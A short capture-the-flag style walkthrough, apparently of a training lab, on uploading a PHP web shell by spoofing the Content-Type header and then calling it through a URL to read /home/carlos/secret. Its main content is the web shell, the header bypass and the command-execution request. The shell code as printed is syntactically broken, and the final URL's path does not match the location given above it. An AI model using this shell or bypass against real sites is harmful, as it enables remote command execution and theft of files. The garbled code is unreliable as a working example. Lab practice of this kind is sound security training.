## Lab: Web shell upload via Content-Type restriction bypass ##

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


First you need to create a PHP file with a malicious code that permits you get information from the system like this one

```
<?php system($_GET(['cmd']); ?>)
```

Save it as exploit.php for example and then try to upload the file.

![[Screenshot_2023-09-21_09_25_22.png]]

Now when you upload the file you must change the content type from application/x-php to image/png and you will bypass with success the exploit.


Now you need to know where is the file, if you look the source code you will see that the "avatar" file that youre uploading is on 

```
/files/avatars/exploit.php
```

On the browser you must search the location and execute the exploit to execute it

https://0a7400de03dc47948094e9d2006c004d.web-security-academy.net/my-account/files/avatars/exploit.php?cmd=cat /home/carlos/secret

Then you will see the secret file and you can submit it .
